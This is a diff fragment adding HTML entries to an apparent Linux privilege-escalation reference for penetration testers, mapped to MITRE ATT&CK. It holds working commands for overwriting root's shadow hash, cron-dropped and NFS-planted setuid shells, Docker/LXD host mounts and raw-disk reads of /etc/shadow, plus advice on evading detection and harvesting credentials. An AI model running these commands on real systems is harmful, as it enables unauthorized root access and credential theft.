+john --wordlist=/usr/share/wordlists/rockyou.txt u    # gunzip rockyou.txt.gz first if it ships compressed</code></pre>
+<pre><code><span class="cmt"># Writable: replace the root hash</span>
+openssl passwd -6 hacked      # generate a SHA-512 crypt hash
+# edit /etc/shadow: set root's 2nd field to the new hash, then:
+su -</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/openwall/john" rel="noopener nofollow">John the Ripper</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1110/002/" rel="noopener nofollow">T1110.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1110/002/" rel="noopener nofollow">MITRE ATT&amp;CK, Password Cracking (T1110.002), readable branch: crack the dumped hash</a></li><li><a href="https://attack.mitre.org/techniques/T1003/008/" rel="noopener nofollow">MITRE ATT&amp;CK, OS Credential Dumping: /etc/passwd and /etc/shadow (T1003.008), readable branch</a></li><li><a href="https://attack.mitre.org/techniques/T1556/" rel="noopener nofollow">MITRE ATT&amp;CK, Modify Authentication Process (T1556), writable branch: replace the hash</a></li><li><a href="https://cwe.mitre.org/data/definitions/732.html" rel="noopener nofollow">MITRE, CWE-732: Incorrect Permission Assignment</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Replacing the root hash changes the real password and can lock out or alert the legitimate admin; note the original to restore it. The on-host shadow write is auditable, unlike the offline crack of a readable shadow, which is silent.</p>
+</article>
+<article id="lin-filewrite">
+<h3>Arbitrary File Write / Read</h3>
+<p class="summary">Turn a root-level write (or read) primitive into code execution or disclosure.</p>
+<p class="desc">A primitive that reads or writes files with root privilege (a web bug, a setuid tool, a path-traversal, a capability) escalates when aimed at the right target. A write becomes root code execution via authorized_keys, a cron file in /etc/cron.d, a systemd unit, or /etc/passwd. A read discloses /etc/shadow, SSH keys, or a token. Pick the target that best fits what the primitive allows (full contents, an append, a specific path).</p>
+<h4>Requires</h4><ul class="req"><li>A read or write primitive that operates with root (or another user) privilege on a path you can steer</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Write → root cron job</span>
+# drop into /etc/cron.d via the primitive:
+echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt; /etc/cron.d/x
+# after cron fires: /tmp/rb -p   (the -p is required or bash drops to your real uid)</code></pre>
+<pre><code><span class="cmt"># Write → SSH key; Read → shadow/keys</span>
+# write: append your pubkey to /root/.ssh/authorized_keys
+# read : disclose /etc/shadow, /root/.ssh/id_rsa</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">T1053.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Scheduled Task/Job: Cron (T1053.003), the cron-file write</a></li><li><a href="https://attack.mitre.org/techniques/T1098/004/" rel="noopener nofollow">MITRE ATT&amp;CK, SSH Authorized Keys (T1098.004), the authorized_keys write</a></li><li><a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">MITRE ATT&amp;CK, Exploitation for Privilege Escalation (T1068), maps to the write primitive origin</a></li><li><a href="https://cwe.mitre.org/data/definitions/732.html" rel="noopener nofollow">MITRE, CWE-732: Incorrect Permission Assignment</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Files dropped into /etc/cron.d, /root/.ssh, or the systemd tree are high-signal integrity events. Choose the least-monitored target the primitive can reach and remove it after use.</p>
+</article>
+<article id="lin-nfs">
+<h3>NFS no_root_squash</h3>
+<p class="summary">Plant a setuid-root binary on a share exported no_root_squash.</p>
+<p class="desc">NFSv3 trusts the UID the client supplies, and an export configured no_root_squash keeps a client root as root on the share. From a machine where you are root (often your own attack host), mount the export, write a setuid-root shell onto it, and run that binary back on the target as your unprivileged user to become root. /etc/exports (or exportfs -v) shows the no_root_squash flag; showmount -e only lists exported paths, not their options, so use it to find candidate exports and confirm no_root_squash by mounting a candidate as root, creating a test file, and verifying from the target that it is owned by uid 0.</p>
+<h4>Requires</h4><ul class="req"><li>An NFS export reachable and mountable with no_root_squash, and root on some client (your own box)</li><li>The target mounts the same export/path, and its mount honors setuid and execution (not nosuid/noexec), so the low-priv user can run the planted file from there</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># List candidate exports</span>
+cat /etc/exports 2&gt;/dev/null; exportfs -v 2&gt;/dev/null   # server-side: shows the no_root_squash option
+showmount -e &lt;nfs-server&gt;                              # remote: only lists exported paths, not their options</code></pre>
+<pre><code><span class="cmt"># Check the target-side mount is exec + suid</span>
+findmnt -no OPTIONS /share    # or: mount | grep nfs   (watch for nosuid/noexec)</code></pre>
+<pre><code><span class="cmt"># Plant a setuid shell as root, run on target</span>
+# on a box where you are root:
+mount -t nfs &lt;server&gt;:/share /mnt
+cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
+# back on the target as the low-priv user:
+/share/rootbash -p</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/001/" rel="noopener nofollow">T1548.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1548/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Setuid and Setgid (T1548.001)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, NFS no_root_squash</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The setuid binary on the share is visible to anyone inspecting the export, and its execution as root shows in process auditing. Remove it once you have a shell. Architecture matters: the planted binary runs on the target, so if your box and the target differ (CPU arch or glibc version) copy the target's own /bin/bash over the mount, or drop a statically-linked shell, rather than your attack host's binary.</p>
+</article></section>
+<section class="phase" id="ph-containers"><h2 class="phase-h" style="color:oklch(0.70 0.13 139)">Groups &amp; Containers</h2><article id="lin-cat-containers">
+<h3><span class="kind">category</span> Privileged Groups &amp; Containers</h3>
+<p class="summary">Escape a container or ride a root-equivalent group to the host.</p>
+<p class="desc">Some group memberships (docker, lxd, disk) are root by another name, and a mis-scoped container is a shell away from the host. Drive the Docker daemon, spin an LXD image, or exploit an over-permissioned or vulnerable runtime to break out to the underlying host.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">T1611</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation</a></li></ul>
+</article>
+<article id="lin-group-privesc">
+<h3>Dangerous Group Membership</h3>
+<p class="summary">disk (raw block-device = read/rewrite any file) is root-equivalent; shadow, adm, and video grant access that shortcuts or leads to root.</p>
+<p class="desc">Supplementary group membership confers access independent of sudo, and several groups are effectively root. disk grants raw access to block devices (read /dev/sda to pull /etc/shadow and other root-owned files; writing a root-owned file is not casual, debugfs refuses it and raw-device surgery on a live mount is fragile). shadow reads password hashes to crack. adm reads sensitive logs. video captures the console framebuffer. Check id for a group that shortcuts to root, and abuse the access it grants.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in a root-equivalent group (disk, shadow, adm, video) or another group with sensitive access</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check your groups</span>
+id; getent group disk shadow adm video</code></pre>
+<pre><code><span class="cmt"># disk group: read the raw filesystem</span>
+debugfs -R 'cat /etc/shadow' /dev/sda1     # or dd the device</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1078/003/" rel="noopener nofollow">T1078.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1078/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Valid Accounts: Local Accounts (T1078.003)</a></li><li><a href="https://attack.mitre.org/techniques/T1006/" rel="noopener nofollow">MITRE ATT&amp;CK, Direct Volume Access (T1006), the disk-group raw-device read</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Interesting Groups (Linux)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reading a block device or the framebuffer is unusual for a normal user and observable by auditd. The access is legitimate for the group, so the anomaly is in what you do with it.</p>
+</article>
+<article id="lin-docker">
+<h3>Docker Socket / Group</h3>
+<p class="summary">Access to the Docker daemon is root: mount the host and break out.</p>
+<p class="desc">The Docker daemon runs as root, so any principal that can talk to it (membership in the docker group, or a readable /var/run/docker.sock) is effectively root on the host. Run a container that bind-mounts the host filesystem and chroot into it, or write a setuid binary onto the host from inside. No container escape bug is needed; this is the daemon working as designed.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in the docker group or access to the Docker socket (/var/run/docker.sock)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm access</span>
+id -nG | grep -qw docker &amp;&amp; echo 'in docker group'; ls -la /var/run/docker.sock; docker ps</code></pre>
+<pre><code><span class="cmt"># Mount the host and get root</span>
+docker run -v /:/host --rm -it alpine chroot /host bash
+# or drop a setuid bash onto the host from the container</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">T1611</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">MITRE ATT&amp;CK, Escape to Host (T1611)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Docker Breakout / socket abuse</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Starting a privileged container that mounts / is a loud, well-known pattern in container-runtime and EDR telemetry. The docker CLI logs to the daemon journal.</p>
+</article>
+<article id="lin-lxd">
+<h3>LXD Group</h3>
+<p class="summary">The lxd group drives the root LXD daemon; mount the host in a container.</p>
+<p class="desc">Membership in the lxd group (the group owning the LXD daemon Unix socket) lets you drive the LXD daemon, which runs as root. Import a small image, launch a privileged container that bind-mounts the host root filesystem, and read or write it as root from inside the container. Like the Docker socket, this is the daemon trusting the group rather than a vulnerability.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in the lxd group</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm and initialise</span>
+id | grep -o lxd; lxd init --auto</code></pre>
+<pre><code><span class="cmt"># Privileged container mounting the host</span>
+lxc image import ./alpine.tar.gz --alias a
+lxc launch a p -c security.privileged=true
+lxc config device add p host disk source=/ path=/mnt/root recursive=true
+lxc exec p /bin/sh    # host FS is at /mnt/root</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">T1611</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">MITRE ATT&amp;CK, Escape to Host (T1611)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, LXD/LXC Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Creating a privileged container and adding a host disk device is recorded by LXD and is anomalous on a host that does not normally run user containers.</p>
+</article>
+<article id="lin-container-escape">
+<h3>Container Escape</h3>
+<p class="summary">Break out of an over-permissioned container to the host: privileged, caps, cgroups.</p>
+<p class="desc">First confirm you are inside a container (/.dockerenv, cgroup names, a sparse process table). A privileged container, or one granted CAP_SYS_ADMIN or a host mount, escapes by design: abuse the release_agent via cgroups (CVE-2022-0492 where notify_on_release is reachable), mount the host disk, or load a kernel module. A mounted Docker/containerd socket inside the container is the same daemon-abuse path as on the host.</p>
+<h4>Requires</h4><ul class="req"><li>Execution inside a container that is privileged, holds a dangerous capability, mounts host paths, or exposes a runtime socket</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Detect the container and its powers</span>
+ls -la /.dockerenv 2&gt;/dev/null; cat /proc/1/cgroup
+capsh --print 2&gt;/dev/null || grep Cap /proc/self/status   # procfs fallback where capsh is absent (minimal/distroless images)
+mount | grep -iE 'docker|overlay|host'</code></pre>
+<pre><code><span class="cmt"># cgroups release_agent escape (privileged)</span>
+# CVE-2022-0492 class: write a release_agent that runs on the host
+# requires cgroup v1 (release_agent/notify_on_release are v1-only); on cgroup v2-only
+# hosts (/proc/1/cgroup shows a single 0::/ line) pivot to a host mount, kernel module,
+# or a mounted runtime socket instead
+# see the Unit 42 writeup below for the full cgroupfs-mount / notify_on_release sequence</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">T1611</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">MITRE ATT&amp;CK, Escape to Host (T1611)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0492" rel="noopener nofollow">NVD, CVE-2022-0492 (cgroups release_agent)</a></li><li><a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/" rel="noopener nofollow">Unit 42, CVE-2022-0492 cgroups escape (Yuval Avrahami)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Escapes touch the host from inside a container, which is exactly what container security monitoring watches for (release_agent writes, host mounts, unexpected host processes).</p>
+</article>
+<article id="lin-container-cve">
+<h3>Container Runtime CVEs</h3>
+<p class="summary">Escape via a runtime bug: Leaky Vessels (runc), the 2025 runc trio.</p>
+<p class="desc">Even a well-scoped container falls to a bug in the runtime itself. Leaky Vessels (CVE-2024-21626) abuses a leaked file descriptor so a container process working directory resolves into the host filesystem, allowing a full escape on runc &lt;=1.1.11. The November 2025 runc trio (CVE-2025-31133 / 52565 / 52881) abuses masked-path and mount races to redirect writes into /proc and break out. Match the runc version to the CVE.</p>
+<h4>Requires</h4><ul class="req"><li>A container on a vulnerable runtime version (runc &lt;=1.1.11 for Leaky Vessels; the fixed 1.2.8/1.3.3/1.4.0-rc.3 close the 2025 trio)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Identify the runtime version</span>
+runc --version 2&gt;/dev/null; docker version 2&gt;/dev/null | grep -i runc</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1611/" rel="noopener nofollow">T1611</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21626" rel="noopener nofollow">NVD, CVE-2024-21626 (Leaky Vessels, runc)</a></li><li><a href="https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities" rel="noopener nofollow">Wiz, Leaky Vessels container escapes</a></li><li><a href="https://www.sysdig.com/blog/runc-container-escape-vulnerabilities" rel="noopener nofollow">Sysdig, runc container-escape CVEs (2025)</a></li><li><a href="https://labs.snyk.io/resources/leaky-vessels-docker-runc-container-breakout-vulnerabilities/" rel="noopener nofollow">Snyk Labs, Leaky Vessels original disclosure (CVE-2024-21626)</a></li><li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv" rel="noopener nofollow">runc, GHSA-xr7r-f8xq-vfvv advisory (CVE-2024-21626)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Runtime exploits are version-specific; confirm the runc build first. The escape produces host-side activity (new host processes, writes outside the container) that runtime monitoring flags.</p>
+</article></section>
+<section class="phase" id="ph-kernel"><h2 class="phase-h" style="color:oklch(0.70 0.13 300)">Kernel &amp; Libraries</h2><article id="lin-cat-kernel">
+<h3><span class="kind">category</span> Kernel &amp; Library Exploits</h3>
+<p class="summary">Exploit a bug in the kernel, a core library, or a versioned service.</p>
+<p class="desc">When the configuration is clean, a code bug still works. Match the exact kernel, glibc, polkit, or service version to a public exploit: Dirty Pipe, GameOver(lay), nf_tables, Looney Tunables, PwnKit and their kin turn an unprivileged shell into root on an unpatched host.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation</a></li></ul>
+</article>
+<article id="lin-kernel-exploit">
+<h3>Kernel Exploit</h3>
+<p class="summary">Match the kernel version to a public exploit: Dirty Pipe, GameOver(lay), nf_tables.</p>
+<p class="desc">When the configuration is clean, the kernel itself is the target. Fingerprint the exact kernel and distro point release, then match it to a public exploit. Dirty Pipe (CVE-2022-0847) overwrites read-only files via a pipe-buffer flaw on 5.8+. GameOver(lay) (CVE-2023-2640 / 32629) abuses Ubuntu OverlayFS. nf_tables use-after-frees (CVE-2024-1086, CVE-2023-32233) are the modern memory-corruption workhorses, with io_uring (CVE-2024-0582, a narrow 6.4-6.7 patch-gap UAF) a more situational option; DirtyCow (CVE-2016-5195) still applies to old kernels. Prefer a public exploit matched to the exact version over a shotgun.</p>
+<h4>Requires</h4><ul class="req"><li>A kernel/distro version matching a known local-privesc exploit (and, for some, unprivileged user namespaces enabled)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Fingerprint the kernel</span>
+uname -r; cat /etc/os-release
+# then match against exploit-db / the CVE, e.g. Dirty Pipe on 5.8-5.16.x</code></pre>
+<pre><code><span class="cmt"># Check namespace reachability</span>
+cat /proc/sys/user/max_user_namespaces
+sysctl kernel.apparmor_restrict_unprivileged_userns 2&gt;/dev/null   # Ubuntu 23.10+ real gate (1 = restricted)
+cat /proc/sys/kernel/unprivileged_userns_clone 2&gt;/dev/null        # Debian/Ubuntu legacy knob
+unshare -Ur id                                                    # live test: EUID 0 in the new userns means reachable</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/The-Z-Labs/linux-exploit-suggester" rel="noopener nofollow">linux-exploit-suggester</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0847" rel="noopener nofollow">NVD, CVE-2022-0847 (Dirty Pipe)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1086" rel="noopener nofollow">NVD, CVE-2024-1086 (nf_tables use-after-free)</a></li><li><a href="https://ubuntu.com/security/CVE-2023-2640" rel="noopener nofollow">Ubuntu, CVE-2023-2640 (GameOver(lay))</a></li><li><a href="https://dirtypipe.cm4all.com/" rel="noopener nofollow">Max Kellermann, The Dirty Pipe Vulnerability (CVE-2022-0847)</a></li><li><a href="https://pwning.tech/nftables/" rel="noopener nofollow">Notselwyn, Flipping Pages nf_tables writeup (CVE-2024-1086)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Kernel exploits can panic the box; run a version-matched, tested PoC, not a blind attempt. A crash and reboot are the loudest possible outcome. Some paths need unprivileged user namespaces, which hardened hosts disable.</p>
+</article>
+<article id="lin-glibc">
+<h3>glibc / Loader (Looney Tunables)</h3>
+<p class="summary">Exploit a bug in glibc or the dynamic loader for root.</p>
+<p class="desc">The C library and dynamic loader are as privileged a target as the kernel. Looney Tunables (CVE-2023-4911) is a buffer overflow in ld.so parsing GLIBC_TUNABLES, reachable through any setuid binary on glibc 2.34+ across default Fedora/Ubuntu/Debian installs. A separate glibc bug class is the __vsyslog_internal heap overflows (CVE-2023-6246 / 6779): these live in the syslog()/vsyslog() code path, not the loader, and are triggered when a privileged program itself calls syslog() with an oversized argv[0] or message, not through the setuid loader. They were introduced in glibc 2.37 (CVE-2023-6246 backported to 2.36) and do not exist on 2.34/2.35. musl-based distros (Alpine) are unaffected. Check the glibc version before firing.</p>
+<h4>Requires</h4><ul class="req"><li>A vulnerable glibc version (2.34+ for Looney Tunables, triggered via a setuid binary through the loader; the syslog CVEs are 2.36/2.37+ and need a privileged program that calls syslog())</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check the glibc version</span>
+ldd --version | head -1
+# or run libc directly for a version banner (path is distro-specific):
+$(ldd $(which ls) | grep -o '/.*/libc.so.6')   # Debian/Ubuntu: /lib/x86_64-linux-gnu/libc.so.6, Fedora/RHEL: /lib64/libc.so.6</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4911" rel="noopener nofollow">NVD, CVE-2023-4911 (Looney Tunables)</a></li><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so" rel="noopener nofollow">Qualys, Looney Tunables (CVE-2023-4911)</a></li><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2024/01/30/qualys-tru-discovers-important-vulnerabilities-in-gnu-c-librarys-syslog" rel="noopener nofollow">Qualys TRU, glibc syslog() overflows (CVE-2023-6246 / 6779)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A failed loader exploit can crash the triggering process and leave core dumps. The version gate is strict; confirm glibc before attempting.</p>
+</article>
+<article id="lin-polkit">
+<h3>polkit / pkexec (PwnKit)</h3>
+<p class="summary">Abuse the polkit authorization stack: PwnKit, or the 2025 udisks chain.</p>
+<p class="desc">The polkit/D-Bus authorization stack repeatedly grants local root. PwnKit (CVE-2021-4034) is a memory-corruption bug in pkexec exploitable by any local user on years of default installs. The 2025 story is authorization abuse rather than memory corruption: CVE-2025-6018 makes an SSH session count as allow_active on SUSE, and CVE-2025-6019 (libblockdev via udisks, default on most distros) lets an allow_active user mount a crafted filesystem without nosuid and run a planted setuid shell. Check pkexec/polkit versions.</p>
+<h4>Requires</h4><ul class="req"><li>A vulnerable polkit/pkexec (PwnKit) or a udisks/libblockdev stack reachable with allow_active</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check versions</span>
+pkexec --version
+dpkg -l 2&gt;/dev/null | grep -E 'polkit|pkexec|udisks|libblockdev'     # Debian/Ubuntu (polkitd/pkexec after the packaging split)
+rpm -qa 2&gt;/dev/null | grep -Ei 'polkit|pkexec|udisks|libblockdev'    # SUSE/Fedora (the CVE-2025-6018 target)</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4034" rel="noopener nofollow">NVD, CVE-2021-4034 (PwnKit)</a></li><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" rel="noopener nofollow">Qualys, PwnKit (CVE-2021-4034)</a></li><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks" rel="noopener nofollow">Qualys, LPE chain in SUSE via udisks (CVE-2025-6018/6019)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> PwnKit is reliable but well-signatured; EDR and auditd rules for pkexec abuse are widespread. The udisks path mounts a filesystem, which is an observable event.</p>
+</article>
+<article id="lin-service-cve">
+<h3>Service Version Exploit</h3>
+<p class="summary">Identify a local service or app by exact version and run its public exploit.</p>
+<p class="desc">Beyond the kernel and core libraries, a locally running or setuid service can carry its own CVE. Fingerprint the exact version of anything privileged (a management daemon, a monitoring agent, an old setuid utility like screen 4.5.0, a printer stack like CUPS) and match it to a public exploit or PoC. needrestart (CVE-2024-48990), which runs as root during package operations on Ubuntu, is a recent high-value example handled in its own note.</p>
+<h4>Requires</h4><ul class="req"><li>A privileged local service or setuid app whose exact version matches a public exploit</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Version the privileged software</span>
+dpkg -l 2&gt;/dev/null | less; rpm -qa 2&gt;/dev/null
+&lt;service&gt; --version    # for each root-run/setuid program</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">MITRE ATT&amp;CK, Exploitation for Privilege Escalation (T1068)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (software versions)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A version-matched exploit is far quieter than a blind one. Some service exploits restart or crash the daemon; weigh the disruption on a monitored host.</p>
+</article>
+<article id="lin-needrestart">
+<h3>needrestart (CVE-2024-48990)</h3>
+<p class="summary">needrestart runs as root and trusts attacker env vars during package ops.</p>
+<p class="desc">needrestart, installed by default on Ubuntu Server, runs as root after package operations. It scans running processes and, for each one it thinks uses a Python/Ruby interpreter, re-reads PYTHONPATH/RUBYLIB from that process's /proc/&lt;pid&gt;/environ and passes it to the interpreter it launches as root. Keep a long-running process alive with a poisoned PYTHONPATH pointing at an attacker-writable dir, and when a package op triggers needrestart your module loads as root. The Qualys advisory covers the family (CVE-2024-48990/48991/48992 and related). Fixed in needrestart 3.8; check the installed version.</p>
+<h4>Requires</h4><ul class="req"><li>needrestart &lt; 3.8 present, and a running process needrestart identifies as a Python/Ruby interpreter that carries a poisoned PYTHONPATH/RUBYLIB in its environment at scan time</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check the version</span>
+needrestart --version 2&gt;/dev/null; dpkg -l needrestart 2&gt;/dev/null</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2024/11/19/qualys-tru-uncovers-five-local-privilege-escalation-vulnerabilities-in-needrestart" rel="noopener nofollow">Qualys, needrestart LPE (CVE-2024-48990 family)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48990" rel="noopener nofollow">NVD, CVE-2024-48990</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The trigger depends on needrestart running (a package install/upgrade), which may not be attacker-controlled. The interpreter loading an unexpected module as root is the observable signal.</p>
+</article>
+<article id="lin-kernel-recent">
+<h3>Recent Named LPEs (awareness)</h3>
+<p class="summary">Awareness only: Copy Fail, Dirty Frag, the ptrace LPE, nf_tables 2026.</p>
+<p class="desc">A cluster of named Linux LPEs disclosed in 2026 that you should recognise on a version check, listed here for awareness with no exploitation detail. Copy Fail (CVE-2026-31431) is a Dirty-Pipe-class page-cache write primitive in the AF_ALG/AEAD crypto path. Dirty Frag (CVE-2026-43284) is a related page-cache write chain in the xfrm-ESP/RxRPC paths (generally needs CAP_NET_ADMIN). The kernel ptrace LPE (CVE-2026-46333) chains a __ptrace_may_access flaw with pidfd_getfd to steal FDs and read secrets. nf_tables (CVE-2026-23111) is another netfilter use-after-free reachable via unprivileged user namespaces. Match the kernel version and patch level; exploitation specifics are intentionally omitted.</p>
+<h4>Requires</h4><ul class="req"><li>An unpatched kernel in the affected range (verify against your distro tracker; some paths need CAP_NET_ADMIN or user namespaces)</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31431" rel="noopener nofollow">NVD, CVE-2026-31431 (Copy Fail)</a></li><li><a href="https://kb.cert.org/vuls/id/260001" rel="noopener nofollow">CERT/CC VU#260001 (Copy Fail)</a></li><li><a href="https://kb.cert.org/vuls/id/980487" rel="noopener nofollow">CERT/CC VU#980487 (Dirty Frag)</a></li><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path" rel="noopener nofollow">Qualys, CVE-2026-46333 (kernel ptrace LPE)</a></li><li><a href="https://blog.exodusintel.com" rel="noopener nofollow">Exodus Intelligence, Off By ! (CVE-2026-23111, nf_tables)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23111" rel="noopener nofollow">NVD, CVE-2026-23111 (nf_tables use-after-free)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Listed for situational awareness. As with any kernel exploit, a version-matched, tested implementation is essential; a blind attempt risks a panic. Interim mitigations include kernel.yama.ptrace_scope=2 for the ptrace path.</p>
+</article></section>
+<section class="phase" id="ph-root"><h2 class="phase-h" style="color:oklch(0.70 0.13 274)">root</h2><article id="lin-root">
+<h3><span class="kind">goal</span> root (EUID 0)</h3>
+<p class="summary">👑 Full root on the host.</p>
+<p class="desc">You hold root (EUID 0) on the host, with full control of its files, services, and any credentials in memory or on disk. From here, harvest secrets (/etc/shadow, SSH keys, application credentials) and pivot: a recovered password or key reused across the network moves you host to host.</p>
+<h4>Requires</h4><ul class="req"><li>Any one successful local escalation vector</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm root and grab a persistent shell</span>
+id     # uid=0(root)
+# if you dropped a setuid bash: /tmp/rootbash -p</code></pre>
+</article></section>
+
+</main>
+<footer>
